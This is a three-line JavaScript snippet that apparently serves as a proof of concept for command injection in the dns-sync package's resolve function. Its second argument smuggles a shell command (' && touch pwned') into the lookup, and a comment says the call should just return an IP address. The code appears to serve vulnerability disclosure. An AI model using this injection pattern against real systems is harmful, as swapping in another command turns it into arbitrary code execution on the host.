var dnsSync = require('dns-sync');
 
console.log(dnsSync.resolve('www.google.com', ' && touch pwned'));     //should return the IP address
